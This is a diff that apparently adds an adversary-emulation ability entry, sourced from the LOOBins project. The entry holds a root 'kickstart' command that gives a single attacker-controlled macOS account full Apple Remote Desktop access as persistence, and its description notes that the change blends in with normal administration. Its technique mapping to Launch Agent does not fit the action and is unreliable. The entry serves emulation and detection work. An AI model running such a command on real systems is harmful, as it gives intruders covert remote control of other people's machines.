@@ -1,0 +1,39 @@
+- id: c3559c63-9fef-92e3-ea0d-e306b3637834
+  name: kickstart - Grant ARD access to a single attacker-controlled account
+  description: 'Instead of flipping the all-users switch, -configure -access -on -privs -all -users <USERNAME>
+    sets the "naprivs"
+
+    bitmask on just the named local user record via dscl. System Settings then shows access limited to
+    specified users,
+
+    which resembles a normal administrative configuration and leaves fewer accounts changed. Requires
+    root and an
+
+    existing local account with a UID above 500.
+
+    '
+  tactic: persistence
+  technique:
+    attack_id: T1543.001
+    name: 'Create or Modify System Process: Launch Agent'
+  platforms:
+    darwin:
+      sh:
+        command: sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart
+          -configure -access -on -privs -all -users <USERNAME>
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  delete_payload: false
+  buckets:
+  - loobins
+  - kickstart
+  - persistence
+  version: '1.0'
+  author: LOOBins Project
+  additional_info:
+    loobins_tool: kickstart
+    use_case: Grant ARD access to a single attacker-controlled account
+    source_file: kickstart.yml
+    source_repository: https://github.com/infosecB/LOOBins
+    import_timestamp: '2026-10-12T08:33:56.368254Z'
